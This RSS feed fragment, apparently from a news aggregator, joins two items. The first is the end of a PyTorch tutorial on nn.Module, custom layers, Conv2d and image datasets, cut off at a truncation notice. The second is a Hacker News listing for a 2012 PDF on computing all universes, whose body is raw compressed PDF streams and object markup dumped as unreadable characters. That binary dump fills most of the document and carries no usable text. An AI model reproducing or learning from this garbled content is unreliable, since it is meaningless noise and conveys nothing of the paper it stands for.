, https://mlwhiz.com/images/pytorch_guide/1_hufb8162ba4b3c0b49f946179a1702f5a7_45468_1200x0_resize_box_2.png 1200w" src="https://mlwhiz.com/images/pytorch_guide/1.png" alt="MLWhiz: Data Science, Machine Learning, Artificial Intelligence"></p><p><strong>Note:</strong> What are PyTorch Variables? In the previous versions of Pytorch, Tensor and Variables used to be different and provided different functionality, but now the Variable API is
<a href="https://pytorch.org/docs/stable/autograd.html#variable-deprecated" target="_blank" rel="nofollow noopener">deprecated</a>
, and all methods for variables work with Tensors. So, if you don’t know about them, it’s fine as they re not needed, and if you know them, you can forget about them.</p><hr><h2 id="the-nnmodule">The nn.Module</h2><p>Photo by
<a href="https://unsplash.com/@fernanddecanne?utm_source=medium&amp;utm_medium=referral" target="_blank" rel="nofollow noopener">Fernand De Canne</a>
on
<img sizes="(min-width: 35em) 1200px, 100vw" srcset="https://mlwhiz.com/images/pytorch_guide/2_huf957eb7cc0803733802fcc4099cfd7cb_2203390_500x0_resize_box_2.png 500w
, https://mlwhiz.com/images/pytorch_guide/2_huf957eb7cc0803733802fcc4099cfd7cb_2203390_800x0_resize_box_2.png 800w
, https://mlwhiz.com/images/pytorch_guide/2_huf957eb7cc0803733802fcc4099cfd7cb_2203390_1200x0_resize_box_2.png 1200w
, https://mlwhiz.com/images/pytorch_guide/2_huf957eb7cc0803733802fcc4099cfd7cb_2203390_1500x0_resize_box_2.png 1500w" src="https://mlwhiz.com/images/pytorch_guide/2.png" alt="<a href=&quot;https://unsplash.com?utm_source=medium&amp;amp;utm_medium=referral&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;>Unsplash</a>"></p><p>Here comes the fun part as we are now going to talk about some of the most used constructs in Pytorch while creating deep learning projects. nn.Module lets you create your Deep Learning models as a class. You can inherit from nn.Moduleto define any model as a class. Every model class necessarily contains an<code> __init__</code> procedure block and a block for the <code>forward</code> pass.</p><ul><li><p>In the <code>__init__</code> part, the user can define all the layers the network is going to have but doesn’t yet define how those layers would be connected to each other.</p></li><li><p>In the <code>forward</code> pass block, the user defines how data flows from one layer to another inside the network.</p></li></ul><p>So, put simply, any network we define will look like:</p><div><pre><code data-lang="py"><span>class</span> <span>myNeuralNet</span>(nn<span>.</span>Module):
    <span>def</span> __init__(self):
        super()<span>.</span>__init__()
        <span># Define all Layers Here</span>
        self<span>.</span>lin1 <span>=</span> nn<span>.</span>Linear(<span>784</span>, <span>30</span>)
        self<span>.</span>lin2 <span>=</span> nn<span>.</span>Linear(<span>30</span>, <span>10</span>)
    <span>def</span> <span>forward</span>(self, x):
        <span># Connect the layer Outputs here to define the forward pass</span>
        x <span>=</span> self<span>.</span>lin1(x)
        x <span>=</span> self<span>.</span>lin2(x)
        <span>return</span> x
</code></pre></div><p>Here we have defined a very simple Network that takes an input of size 784 and passes it through two linear layers in a sequential manner. But the thing to note is that we can define any sort of calculation while defining the forward pass, and that makes PyTorch highly customizable for research purposes. For example, in our crazy experimentation mode, we might have used the below network where we arbitrarily attach our layers. Here we send back the output from the second linear layer back again to the first one after adding the input to it(skip connection) back again(I honestly don’t know what that will do).</p><div><pre><code data-lang="py"><span>class</span> <span>myCrazyNeuralNet</span>(nn<span>.</span>Module):
    <span>def</span> __init__(self):
        super()<span>.</span>__init__()
        <span># Define all Layers Here</span>
        self<span>.</span>lin1 <span>=</span> nn<span>.</span>Linear(<span>784</span>, <span>30</span>)
        self<span>.</span>lin2 <span>=</span> nn<span>.</span>Linear(<span>30</span>, <span>784</span>)
        self<span>.</span>lin3 <span>=</span> nn<span>.</span>Linear(<span>30</span>, <span>10</span>)

    <span>def</span> <span>forward</span>(self, x):
        <span># Connect the layer Outputs here to define the forward pass</span>
        x_lin1 <span>=</span> self<span>.</span>lin1(x)
        x_lin2 <span>=</span> x <span>+</span> self<span>.</span>lin2(x_lin1)
        x_lin2 <span>=</span> self<span>.</span>lin1(x_lin2)
        x <span>=</span> self<span>.</span>lin3(x_lin2)
        <span>return</span> x
</code></pre></div><p>We can also check if the neural network forward pass works. I usually do that by first creating some random input and just passing that through the network I have created.</p><div><pre><code data-lang="py">x <span>=</span> torch<span>.</span>randn((<span>100</span>,<span>784</span>))
model <span>=</span> myCrazyNeuralNet()
model(x)<span>.</span>size()
<span>--------------------------</span>
torch<span>.</span>Size([<span>100</span>, <span>10</span>])
</code></pre></div><hr><h2 id="a-word-about-layers">A word about Layers</h2><p>Pytorch is pretty powerful, and you can actually create any new experimental layer by yourself using <code>nn.Module</code>. For example, rather than using the predefined Linear Layer <code>nn.Linear</code> from Pytorch above, we could have created our <strong>custom linear layer</strong>.</p><div><pre><code data-lang="py"><span>class</span> <span>myCustomLinearLayer</span>(nn<span>.</span>Module):
    <span>def</span> __init__(self,in_size,out_size):
        super()<span>.</span>__init__()
        self<span>.</span>weights <span>=</span> nn<span>.</span>Parameter(torch<span>.</span>randn(in_size, out_size))
        self<span>.</span>bias <span>=</span> nn<span>.</span>Parameter(torch<span>.</span>zeros(out_size))
    <span>def</span> <span>forward</span>(self, x):
        <span>return</span> x<span>.</span>mm(self<span>.</span>weights) <span>+</span> self<span>.</span>bias
</code></pre></div><p>You can see how we wrap our weights tensor in nn.Parameter. This is done to make the tensor to be considered as a model parameter. From PyTorch
<a href="https://pytorch.org/docs/stable/generated/torch.nn.parameter.Parameter.html#parameter" target="_blank" rel="nofollow noopener">docs</a>
:</p><blockquote><p>Parameters are
<a href="https://pytorch.org/docs/stable/tensors.html#torch.Tensor" target="_blank" rel="nofollow noopener">&lt;code&gt;*Tensor*&lt;/code&gt;</a>
subclasses, that have a very special property when used with <em>Module</em> - when they’re assigned as Module attributes they are automatically added to the list of its parameters, and will appear in <em><code>parameters()</code></em> iterator</p></blockquote><p>As you will later see, the <code>model.parameters()</code> iterator will be an input to the optimizer. But more on that later.</p><p>Right now, we can now use this custom layer in any PyTorch network, just like any other layer.</p><div><pre><code data-lang="py"><span>class</span> <span>myCustomNeuralNet</span>(nn<span>.</span>Module):
    <span>def</span> __init__(self):
        super()<span>.</span>__init__()
        <span># Define all Layers Here</span>
        self<span>.</span>lin1 <span>=</span> myCustomLinearLayer(<span>784</span>,<span>10</span>)

    <span>def</span> <span>forward</span>(self, x):
        <span># Connect the layer Outputs here to define the forward pass</span>
        x <span>=</span> self<span>.</span>lin1(x)
        <span>return</span> x
x <span>=</span> torch<span>.</span>randn((<span>100</span>,<span>784</span>))
model <span>=</span> myCustomNeuralNet()
model(x)<span>.</span>size()
<span>------------------------------------------</span>
torch<span>.</span>Size([<span>100</span>, <span>10</span>])
</code></pre></div><p>But then again, Pytorch would not be so widely used if it didn’t provide a lot of ready to made layers used very frequently in wide varieties of Neural Network architectures. Some examples are:
<a href="https://pytorch.org/docs/stable/generated/torch.nn.Linear.html#torch.nn.Linear" target="_blank" rel="nofollow noopener">nn.Linear</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.Conv2d.html#torch.nn.Conv2d" target="_blank" rel="nofollow noopener">nn.Conv2d</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.MaxPool2d.html#torch.nn.MaxPool2d" target="_blank" rel="nofollow noopener">nn.MaxPool2d</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.ReLU.html#torch.nn.ReLU" target="_blank" rel="nofollow noopener">nn.ReLU</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.BatchNorm2d.html#torch.nn.BatchNorm2d" target="_blank" rel="nofollow noopener">nn.BatchNorm2d</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.Dropout.html#torch.nn.Dropout" target="_blank" rel="nofollow noopener">nn.Dropout</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.Embedding.html#torch.nn.Embedding" target="_blank" rel="nofollow noopener">nn.Embedding</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.GRU.html#torch.nn.GRU" target="_blank" rel="nofollow noopener">nn.GRU</a>
/
<a href="https://pytorch.org/docs/stable/generated/torch.nn.LSTM.html#torch.nn.LSTM" target="_blank" rel="nofollow noopener">nn.LSTM</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.Softmax.html#torch.nn.Softmax" target="_blank" rel="nofollow noopener">nn.Softmax</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.LogSoftmax.html#torch.nn.LogSoftmax" target="_blank" rel="nofollow noopener">nn.LogSoftmax</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.MultiheadAttention.html#torch.nn.MultiheadAttention" target="_blank" rel="nofollow noopener">nn.MultiheadAttention</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.TransformerEncoder.html#torch.nn.TransformerEncoder" target="_blank" rel="nofollow noopener">nn.TransformerEncoder</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.TransformerDecoder.html#torch.nn.TransformerDecoder" target="_blank" rel="nofollow noopener">nn.TransformerDecoder</a></p><p>I have linked all the layers to their source where you could read all about them, but to show how I usually try to understand a layer and read the docs, I would try to look at a very simple convolutional layer here.</p><p><img sizes="(min-width: 35em) 1200px, 100vw" srcset="https://mlwhiz.com/images/pytorch_guide/3_hu6bac2fdb22e4c85a567731e38a09e400_109832_500x0_resize_box_2.png 500w
, https://mlwhiz.com/images/pytorch_guide/3_hu6bac2fdb22e4c85a567731e38a09e400_109832_800x0_resize_box_2.png 800w
, https://mlwhiz.com/images/pytorch_guide/3_hu6bac2fdb22e4c85a567731e38a09e400_109832_1200x0_resize_box_2.png 1200w" src="https://mlwhiz.com/images/pytorch_guide/3.png" alt="MLWhiz: Data Science, Machine Learning, Artificial Intelligence"></p><p>So, a Conv2d Layer needs as input an Image of height H and width W, with <code>Cin</code> channels. Now, for the first layer in a convnet, the number of <code>in_channels</code> would be 3(RGB), and the number of <code>out_channels</code> can be defined by the user. The <code>kernel_size</code> mostly used is 3x3, and the <code>stride</code> normally used is 1.</p><p>To check a new layer which I don’t know much about, I usually try to see the input as well as output for the layer like below where I would first initialize the layer:</p><div><pre><code data-lang="py">conv_layer <span>=</span> nn<span>.</span>Conv2d(in_channels <span>=</span> <span>3</span>, out_channels <span>=</span> <span>64</span>, kernel_size <span>=</span> (<span>3</span>,<span>3</span>), stride <span>=</span> <span>1</span>, padding<span>=</span><span>1</span>)
</code></pre></div><p>And then pass some random input through it. Here 100 is the batch size.</p><div><pre><code data-lang="py">x <span>=</span> torch<span>.</span>randn((<span>100</span>,<span>3</span>,<span>24</span>,<span>24</span>))
conv_layer(x)<span>.</span>size()
<span>--------------------------------</span>
torch<span>.</span>Size([<span>100</span>, <span>64</span>, <span>24</span>, <span>24</span>])
</code></pre></div><p>So, we get the output from the convolution operation as required, and I have sufficient information on how to use this layer in any Neural Network I design.</p><hr><h2 id="datasets-and-dataloaders">Datasets and DataLoaders</h2><p>How would we pass data to our Neural nets while training or while testing? We can definitely pass tensors as we have done above, but Pytorch also provides us with pre-built Datasets to make it easier for us to pass data to our neural nets. You can check out the complete list of datasets provided at
<a href="https://pytorch.org/docs/stable/torchvision/datasets.html" target="_blank" rel="nofollow noopener">torchvision.datasets</a>
and
<a href="https://pytorch.org/text/datasets.html" target="_blank" rel="nofollow noopener">torchtext.datasets</a>
. But, to give a concrete example for datasets, let’s say we had to pass images to an Image Neural net using a folder which has images in this structure:</p><pre><code>data
    train
        sailboat
        kayak
        .
        .
</code></pre><p>We can use torchvision.datasets.ImageFolder dataset to get an example image like below:</p><div><pre><code data-lang="py"><span>from</span> torchvision <span>import</span> transforms
<span>from</span> torchvision.datasets <span>import</span> ImageFolder
traindir <span>=</span> <span>"data/train/"</span>
t <span>=</span> transforms<span>.</span>Compose([
        transforms<span>.</span>Resize(size<span>=</span><span>256</span>),
    transforms<span>.</span>CenterCrop(size<span>=</span><span>224</span>),
        transforms<span>.</span>ToTensor()])
train_dataset <span>=</span> ImageFolder(root<span>=</span>traindir,transform<span>=</span>t)
<span>print</span>(…</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mlwhiz.com/blog/2020/09/09/pytorch_guide/">https://mlwhiz.com/blog/2020/09/09/pytorch_guide/</a></em></p>]]>
            </description>
            <link>https://mlwhiz.com/blog/2020/09/09/pytorch_guide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065771</guid>
            <pubDate>Thu, 12 Nov 2020 02:30:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Fastest Way of Computing All Universes (2012) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25065400">thread link</a>) | @optimalsolver
<br/>
November 11, 2020 | http://people.idsia.ch/~juergen/fastestuniverse.pdf | <a href="https://web.archive.org/web/*/http://people.idsia.ch/~juergen/fastestuniverse.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>äÈhÓY2_Ê²é[leóŒ‚÷*LÊxäñÎãÉÇÃ€ÎdŽíâ¢Sü
çîl'8ú}GV³±¯z€„{@šÃRXÔBÊ€3´£\ˆÌŽ�e3ƒ9™úP%‘'»O]D?AlÈÿ’¹f§ˆˆY=³{’ÂJØEy†ó6Ëý`ï
lh&lt;ßt{àT_±ãE‘¦°
´"€ƒ„›Ú?ÚÂªz„ìÆFeÈ�èU#®#qR¢úLGÜùa¾Ø)
Ø‰FæÌ\$Änÿ©îE´šø÷ã£‰+4Ï‡Ð¬³¶A¨-ñÈ¹ëjà]�Ñ¦a!ïöùÁÏi8Q	0)�éeFxº„¼ì]‘ÌI+ôØ'_Ô)†Î!ùç"r’àÐÄ0ð0LèÝØ¼yà#RZbVý~&amp;6ÐA7Íäh6±Æ		¤Á.½ÞÊˆRÏ)º¥ÞŽT¶ÔN`=D�4C§EYª1»¹2¡CMð�¤bÜÁÁî85¡bìÅDl6e‘jì¼Ñ¼8¼èLBŒ7á~L˜²–¿ÊÝ‰Dé	K%†·&gt;¸K� ú
òŠ(DÈkXÉóÃ3„{…™ŽJ•Ý²!môSb4·!Æ˜´F‘èˆ×(|ˆ"Ë™N°&nbsp;üq68šÚõ…åm�,ïy@
°—Í
{‰ByG8Ñ'÷2ñv¼7Õ¨´Î¶*�}Îƒæ¡ùêY^aE0Ù5i°;$ÇDñ	x¼4çˆtCÇ=Ð0ß­›QÏ2Êš!~f£]ðÝ]˜8ë('&gt;=˜ßª`ûŒ*è[]–&amp;vWá„à]P,KèwäÙ¼‰44_È¹
&lt;¢W¼_ÕåÏÉÞ9¡ðESI=gF‘7õ]Õ»j¡onüÚì´/~žÓ&gt;Éé¹¦YqB/P2§ý0™Ñ¶5et­‹¦*y‘õqË®$ßp~Ò”Ã¢&gt;º@ËP¼™vÛ�$P&amp;YcWãBÙ‰žs§úÜ®é«–RY¹úAÝÁõ%ùåì‡–õô@3­ÙšÛ1oDÏì6 Eõ£…³
"‘aÛ–bnÖÖêžºHÙ‚Gqwnrm?uó®j�¸.BÎ‘h.ZžjÌö¾J ˜ÜN^ÊxÍ¤eÅëFj]%êö”x,Ó&amp;~Ý•ð¢n’Š‹DÍÄŒsáþªPæ|
�;�þ_
X;YJ{péZºi³;7¯½¥ú±š…SÎþEÿf‡¤M
Úµ‚tGt†´Cjõ«¼Þt™kÕ­Å¨œ®¼ÎTj}œêÞ{q6güJw±ðÂ9â"¯Ñ¼„cþÍ÷¾–\DóÜÚKÁû‰æ»6HÿÕqcokC{•_[R–�»¤¸ „«B7E°Žªù^íþ¡Od�Ÿ¹4îo\S�èªí*úÉ™öŠÅ+ &amp;æX(ã¢&amp;WF¿¦ÊtCUÄ‚,•4‘}'Õ8öÎ]åºGÁßÛW
’·Õ0¢Zx)3‹p£“2tÏú¬€Õ,Áö“öŠZ:)iøÍ”o–h¤åŒç˜î;­‚|ÇßYxXkÈˆÐôUßÈGo›€ä�ª÷hùÍ¢:Ûª«8™T•,ÍefR)…rä„¢”xI1E×˜‹—x8�VDFºªFòšo×:ë}Êt6Šî%óe¯†õãv‰ÐU,Y¦0��Âh·ŸñÿÜãcŽpx-ì¶èç%“ñ®ùÜ­ÆéÈ0OÄôD½8æm¡ÞN˜PÂXHBŽØ“«Ú‰a.û9fˆ�­‚N!!U:»7å‘-p†¸þ=Ñç&gt;¢r0JŠ·Ì’	2³!ÎAÃ‚úS@Ñ@€ªƒú½m&amp;f7/ŠE–`b7&lt;²û	]ô13	u‰E™Öð9/šË0ô*7ä«a¥^Ç8DÆìÖ
éÆpð)Œ¥ÆÍþ@
âýee­nû÷é"›±œïnövç}�
Äp¯¦�µbØaî´K1ií%rýõâ¿3dsÑ$?¡&nbsp;xïxœüXne~Û¾å�¥VôÌ
IÊy‰Òjôi'=è‚Ûš�Ø‹€a¾Z roÈñ©àjñÔÏM€ô18cËþ¸ÆÐñMãÕg�—!˜qµð.Ê½¦HÎÁ
�ÅáJŽ'ô=¹ iÛêÔë0p�+%…–7–w­ã¥p¨w·¼¢�åŽ”CSKtë¢-Rcyân"ª·Hõ0/Õ)Á7ÆvÙJUIz˜lYçŒ	hzÙèp&nbsp;^�&gt;©Ê‹!7ÙÕ¥é„îŸq†3�
$QKŽ4/ô&nbsp;LA�ís&gt;«[àKõz•Ü»ë.ÑácÏfÜÌT-¡¯£ª}R!�í^³ªÚäîð²]Zà-
ŒTïRñqøž@eZÏy±"‹i¦¤™Mª¬ª0¯j“‹
3œ*ò–4ÇÌ˜Vy½p—¾ÆÜ‚ÕògY|bˆ®“&gt;°iÉ[-Ç#áÇR-"BÙ2¡^¨Ÿ•Š�\Æj4Ãeì&amp;s1ñ)eS&lt;+‹’3$n¡öw1Rw}^¤xÐ¶&nbsp;œ4�}Ç=W�s¨›9ˆçj­ÙÏ"ùŽs¥lÄ:üø†1õld=Ä[�º˜�Òbg¥¶çL«ÉØÓÑ?Qè¡æÖª9ÖgŸGÒ¤Å˜óçç€Ð¡�¡3©OScÏBÞTT}ŠÇ8!Ì¯,NW#P�CÎ¹ú®/Ö€,(=ì6jørÍwúôÄ�|eÞ¬h°d^)›YY
´–^¿È=	j™ñáb
®Ù-�yçyu(�¨¬r;©êe·Ëj,ÆJ3´øÚdÚ÷�²Œ¥GŒm«ªý5‡q¹dµ9©-¦Í¹k�•¶§ñ„ž+ò–l6ý&lt;9MPwñRö¢yÆËTöp
K‹[ukbŠ¶�ê*4?Yqÿ$¢«’±1&gt;w"Ú‡SÝÃ±_np#ë½2î›"Õ®æj�ž½Žd¶”S¶ª¸ow!�êOPrRÐÑ$âÍ÷Ö<l}k&r>ù�dÑ24ïÎå’+Í;X-Š¥x—Ü�ñ¥jÓ¿îÏž”uC8)Öx�&nbsp;º•m3¾�WÉsRM8…û‰T‹2d¼¢¤àz‹‹ú¢ÚqÆ(g&nbsp;î“�úVË`¥É’ »6¯!=µ7Ò*„¤w"~¹„’e›8ybJ‚*6­÷ ½‡¹ùi“ƒüœ¹âLKÂ“]æ’EÅ¬À&nbsp;®([ÐïòöÈz_T™u¬�£2ø÷½þ|Ñ$ß‹¿_~\þ·Þ’[
endstream
endobj
4 0 obj
   3245
endobj
2 0 obj
&lt;&lt;
   /ExtGState &lt;&lt;
      /a0 &lt;&lt; /CA 1 /ca 1 &gt;&gt;
   &gt;&gt;
   /Font &lt;&lt;
      /f-0-0 5 0 R
      /f-1-0 6 0 R
      /f-2-0 7 0 R
      /f-3-0 8 0 R
      /f-4-0 9 0 R
      /f-5-0 10 0 R
      /f-6-0 11 0 R
      /f-7-0 12 0 R
      /f-8-0 13 0 R
   &gt;&gt;
&gt;&gt;
endobj
14 0 obj
&lt;&lt; /Type /Page
   /Parent 1 0 R
   /MediaBox [ 0 0 611.999983 791.999983 ]
   /Contents 3 0 R
   /Group &lt;&lt;
      /Type /Group
      /S /Transparency
      /CS /DeviceRGB
   &gt;&gt;
   /Resources 2 0 R
&gt;&gt;
endobj
16 0 obj
&lt;&lt; /Length 17 0 R
   /Filter /FlateDecode
&gt;&gt;
stream
xœ•ZÉŠ4Ç¾×SôL+÷†&gt;„Aàƒì~|è®žË ùà×w|±dfÍt[2BóWeeFFÆòÅ’ýëæNµ‡SñþôR»?ýö~úûé_4Šÿ~ûéôÝÕ�~ú÷ö§·­œ{��Çõ±»s-½÷z*C¥·xzûeûîãÅ½¸“?½}lß^�wáú«‹——˜Ó«K—ÿêò…þr•ñÝ•€·1±oîÊo×Ë?Þ~Ø|?·Ö#±òvÇ·Kh¯n¿D÷êîîÝ}]ï¼Ç*ˆ†�&gt;ù&lt;_?z�Y7úŽíé#Æ#;&gt;æWeÂ;3ðîo~÷z×ß}ðIŸuóà6¿¡Ÿk,Ùø
	`C¨ú�C$ÒÙ…�h“„Õ4Ybî"3qÇô¢ŒbƒïßTeýóÉ�Cï§ÿÐÀôÿÏÛ·Ð�;Ý7ïN9ýJzÁDü%…ŸIPÛþËÖÂ¹§~zñ¾œcÍ§_N6ÒÃ9÷ÿ&lt;ýíôãöœ@gçñ{#5Ÿ{XF~—)6IäÏéÿ£AÜ¶¶žcýÁƒØ¹›sçTã"‰J†žKøÃ¢ Ÿ8‡¸ŠÂFþð1&amp;cès?ñaeâ¬!~æcø;9z%WvBR}Ìç˜[ï…€¢žc½eõôfžÎŽNNþö3†»
Óüƒ££›³^b#·�äøÙW]£;97ÀàF&gt;›îç^x™;éãÂGníÜ›ë­(aAœ›#<swï. ¡’·Àubˆ¯ÄvxspïpƒèÍÝh6¹¢¼ß7ššÜn~"6��Ê;wÃ•ÈÑ÷»&¼r÷%t¥ÍÞë’‚œº¬Û7×vx="">‘aØÀŠâÞ‰ÝÚ‘a)æðl™çF´4n´yü´G&nbsp;ó¦ä/z@·‡N,AšŽÀ@‚=€YBDZCÀG¸ÆgyaZþ5&amp;…%ú	¯‰M²KÝmc¹à5“hy=íá»J�9Þ]Wñ`6tìô�•2ŽàÝ¦ëÉ vÖXæôSÐ(«bd™î5šPÐ(ÂnC×¹Ÿh-MÁDçœ†”IßIšbÊÞ,‹fBuEM¹ùÛå¥8õ‡�kX¾Ò+�8/˜)6Æ&nbsp;
¤ãð‘Œ�
áÚ‰mÚ¸&gt;Ö‚ÉÕÀ™�èK.I5ù�çê Ú‹BV„[up„ahO'¤sÈàsè&nbsp;L¹°mÑÛéXzåX)ë%jN:Wõ…4fß§&amp;yFŸ&amp;J4%¤yÙËñ'0^ÔX×ƒëºÈÉ&lt;ËP½_£(;§¢o¤XŸßŸØ;‰ôØ�ÉÖ™"†˜j…‰VFÞ0"x¡Ï"ÚB¢�NÍ&lt;ú
Ž×*}*—Y XSL•¶eaOOÅ1|\m?ÕÆG!&amp;
±ZÞÞØ¸N#+&amp;â!ü9	GšdÅ¡ƒp}$0.0õ¯	žÏñLÞRÜ¡è›zëŠ·eâ~¢CÐúx]
ÅÚ.Óút®µÏõ¼žÐ›jb¨ƒPè¿›Œ�);&lt;{+”l’Åç³ãÓn"·4T˜aúÞ'5À7Lñjw&nbsp;a¢ÎF­ˆ$IÊ
k¬åÒ^c€fÆ`3²Š¤ªØp=¿Cô/$K:~?ÂÍ7sÎèíÜû#ciÃ£šôÌK6v¼Ka7‰~æÑ!Å†¯È&lt;‰ÂD'ÁÅ'”žž…T²3$š)î2]OÀ˜á6ÅŒ+Þóâ+¢Bùê¥Ù%øêÍ¢ZïŒˆWŽÈ…(86Zò¡¢ÈåõåªR¢çÐ)ãeö»°ÒqXñP‘#½I¤É&gt;4V/GÐi7²ü.ˆ)òÞ¬òïMAQva&nbsp;8µGÁæ›Z¶ ±—°¥ç¹ž@ÿ)ùƒ]¾+x.éÅKâÀº±µ#úxÑ3¨“²š;¢&nbsp;˜;ÇCÑÏÅû
í¬C'úªÙJ´×UMI«à7&amp;Ó#�JÜóŽÁ!ñö%BŽ„"å½
&gt;ô	ƒ¾�ÿìÂŒ6¸ÂjãçKN²T¢«~N¸Í	Œ¢·Y&nbsp;.Ê¤p›*‘	tÞmÝ4¹Ýùoà¿2RŸ¤¹ÑQÚ¨²ötâ)ô¨Éþ°K~
ëñx
!O¹‹§óÈ�”�-òÕMŒÊ¨ˆeGo©²RxO9ùj¼ŒWd{‡ä+:ÿØRDjêd�‘{U(fc,Šü¢+ëL+Š,?B£”ý%ËŸaÃk‚Ú<k“iÐ"{¬€¹Éfº…É‡È5ò pb€mfëbØnŠñrÇ¼="" îŽÄ£p´q²Ú•)2£ø@b£•‚çê6�¤Ì@¡i<�ç"ûqz%Ù="">Ì4ë(z9ÃFsÓÌÖ()uƒ˜ò¿†˜gYFF!Â›&gt;É3ÈÅC†‹Ç^Ï5&amp;Øþ—&lt;ãª~ãŸdT—’‘mP¦rö”·*«ßH%£`o¶±XªloôMå*2U=r~yãñ‡\×jC˜ã
“óH%EfçõìNá\Õõ³7/-¤¨åáUÚcàE#¦¼‰Aqù„×+²ÍâxÄ]7«oÄøÝˆÑ¼@ÎÏOX†çð:™¦ó))«XZæ~
ûiøaKúrñZ�,F¶Ûœp	‹eûªxsÎ$ÿÅÁ$×JMK8tx;bÏ±2$êµu•­¬Ý,�À@å•õX£ÉcQÑUd»m¾¹«%
û0øÐxë$
ZNû3ÈYŠD\áŽ#cy’;�@Õ÷¤Å;?gÓšW­J2ÄOT¾�!‚óy†ñdÀ`´þª”ì×ÆèY‘ý¢}Š©ã»n­¢cSjME™7~ÜQaßwÙÊz*báAº+±²¥è¬ÐÇã
¨ÆÞÛÆWnHð :»æÉÜHp�qX2C	èŒ¬�Ù…²�‰«9ýj&amp;·‘®!w¶EÛîºª&nbsp;µœG\Ù‹M�þQ.�¯Þú1CßÆ‹Á—™‹Œ¨*˜¾?1š$É¸@6Ãà!ºÜÜÀB‰lê2ïÀke#�â7¥,-ó¡*ixX³ì�ÓÛ¤‰:7&gt;(=V}D†åÑ3uÓ�¥((%8ç€ñ)×wån6@ßÌ
ßgKè®ŒI¾©�•ç
‚
mð„À—
D.Ä©•��|µ‚JuÀs¤Óg2dã ‰èÇÆÂ�¾óîCVV EŒF˜©ÑùtÕ·àƒ”!�ŒÃÚ¿[¯ŒÂ¾¿Ž(ñ©
ÇßâÚ¾BÆlø�˜·}Š™Ü¬[½ziÞÍZÔÜ
­O3o®adIg‡ec–®_Ê[?2æt‰D¾YÿJÚ”j‚’®sSXKBeêE[ŠÏ²—oÂá.­Ú”›5xrÿ’”ƒ2îË‚ªÆf˜Ø­D21pXâ™Œžw[u&amp;—.É‰€Ü
"úØæ.\ÒáÉ�Ö÷ÒYÉÍàilb&nbsp;;r¢÷8»UF•
ÖË‚~Y�p"“„k×ªçN;Ù¤-#™%“à"Ž N&lt;|XÑC2&nbsp;”~@8‡Å¨;/¹ÃŠzñÆi…ÄçÆhÞ‚ÞM¾"ƒ2zë‘#±ewÜ‰é`=&nbsp;Ô÷9çØÙŒ3QªÏüì°ó@ZŽÂÀrv)$½L½KØûŸ¹ùñÍª
MÒT<h[Þg*à-ÜÑ9Òyq3Ô?n2®&ž�mŠ®¸‡93×Ñ«Ìvvu#;.¸ƒŠÐj…:ú!‰b¹&�yÛ\Çj·�ØÏ¸jß²”Ã3y–w-‡„ã¹Àfg¹Ù¥qbëã>ã¬dÒ±M›ÃòYQ¯&nbsp;õÌÕòÀ/'+ÅrúJlò`Pº­MöVæ#qÆ7R‰9¼k×9¦ä5Ñ”GAízó³¥©Ç­z~û½|Œ2î‘I)Þ¬×[MR—ŠãÄ�$ž[_.JÙÍ6"Úa›ùh=¤,Yš^ÁŒh¥¾ÔùÒMÈV�UX@£ªƒýSôRCÜ¾%r(ìnólk‰V5ÍÍ?h$³·‰•ø‘}[¦L¼hþˆù·%v!(ä¼ä¶:d²’D2´c”=(ÇûZ¾ÇÏ%&nbsp;IåÕâÁã'!_ª÷ðì–€&lt;óÜ_-øVHry®_o	Þõ^�üY!Øí@—7«$¤àNgŸBëéKP»y+{wDoü�ÃUî
}×*HK9«äóµs­¦9üñ“‚S(ÙB,.��Eãb}ÃuÓíÓ®LaIõ�m+‘™§Þò¦— [3ðM½ç\~´è‡~N'ñ)–×ðÁi?8
øk­ÅJR/fÜV°.*&gt;ÏÑo’åKôUï¸Hëz‡ß‚cõŒÐü1ÓÐ&amp;æ®Sµ�†äO��%Ñe›9ë•&nbsp;7,Ä‹¹ÂˆN’ÚKæ&amp;œAj�cHEMìfG…�Pâ¶ÿçIÑ--ÿçÝ•€ŸÍËcí]ó©ùwO#›Š’TûÛ8µ\»pÚäº'MÍl’;È2µÕ8¢½xë%®×/Æ]Pˆg&gt;ºÅ*E¦a¥†È]�-r\½Ã‘—Ÿ¬k\ÃÝÅ`ä.×Ùõ»Ü-oúÃŠxH@@»�Ì‡½ÛåX‹uy)L¢Ý°Ï�‹¼#u�û8yüä„(2¢bõ’‰cÐ~\°S&lt;åû¡}²‡òµO›‡,íž’3ÌqëÁ§{’ßÇEbéƒÑ¥£¬e¯&nbsp;‘%—ÓGþò�ðU•_Ù‰D©wöY4ý’fÙÛ7ñkÇ­gIRÇ,&nbsp;*~7:‡œÜ»šîçÊÈuŒ©ñ&amp;Œ=ëÈ/Œ§±z)Å«·íHsž¯¹vWd8âfY"¼#‹ó‡®«auF±™ëñ
üó˜&amp;kˆ”³½7ý_à«$¯+e¦±èNN(èE�&gt;e¾kòš �Y”†TòYB[µ³çFr§ò�.&lt;ÐptªaþY„i—Gí:UqW-ó—%K©&amp;¿V5âç�_ûPÐûícQî~šÝ'«ßpú=Ð&amp;�BP¹7Âi¶rO8”3u+t´xqó&gt;F{Åý×Ëêïß¶·ÿÖ±8œ
endstream
endobj
17 0 obj
   3732
endobj
15 0 obj
&lt;&lt;
   /ExtGState &lt;&lt;
      /a0 &lt;&lt; /CA 1 /ca 1 &gt;&gt;
   &gt;&gt;
   /Font &lt;&lt;
      /f-0-0 5 0 R
      /f-8-0 13 0 R
